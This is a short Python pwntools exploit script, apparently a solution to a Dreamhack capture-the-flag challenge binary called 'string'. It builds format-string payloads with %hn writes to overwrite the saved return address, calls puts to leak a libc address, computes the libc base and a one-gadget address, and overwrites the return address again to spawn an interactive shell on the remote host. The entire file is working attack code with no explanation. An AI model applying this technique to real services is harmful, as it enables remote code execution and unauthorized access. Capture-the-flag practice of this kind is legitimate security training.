from pwn import *
rest = ''
c = 0
def fmt(addr, data):
	global rest, c
	offset = len(rest)/4 + 5
	payload = p32(addr) + p32(addr+2)
	low = data & 0xffff
	high = data >> 16
	payload += '%{}c'.format(0x10000 -c - 8 + low) + '%{}$hn'.format(offset)
	c = low
	payload += '%{}c'.format(0x10000 - c + high) + '%{}$hn'.format(offset+1)
	c = high
	padding = 'a'*(4 - (len(payload) % 4))
	c += len(padding)
	payload += padding	
	rest += payload
	return payload

def comu(fmt):
	global rest, c
	rest = ''
	c = 0
	p.sendlineafter('> ', '1')
	p.sendlineafter(': ', fmt)
	p.sendlineafter('> ', '2')
	return p.recvline().split(': ')[1]
p = remote('host1.dreamhack.games', 18195)
libc = ELF('libc.so.6')
elf = ELF('string')

addr_main = elf.symbols['main']
addr_ret =  int(comu('%3$x'),16) - 0xc
addr_plt_puts = elf.plt['puts']
addr_got_puts = elf.got['puts']
seg = fmt(addr_ret, addr_plt_puts)
seg += fmt(addr_ret+4, addr_main)
seg += fmt(addr_ret+8, addr_got_puts)
comu(seg)
addr_libc_puts = u32(p.recv(5)[-4:])
log.info('addr_libc_puts: ' + hex(addr_libc_puts))
addr_libc_base = addr_libc_puts - libc.symbols['puts']
offset_oneshot_local = 0x3cc67
offset_oneshot_remote = 0x5f066
addr_oneshot = addr_libc_base + offset_oneshot_remote
log.info('addr_libc_base: ' + hex(addr_libc_base))
log.info('addr_oneshot: ' + hex(addr_oneshot))
addr_ret =  int(comu('%3$x'),16) - 0xc
seg = fmt(addr_ret+4, 0)
seg += fmt(addr_ret, addr_oneshot)
comu(seg)
p.interactive()
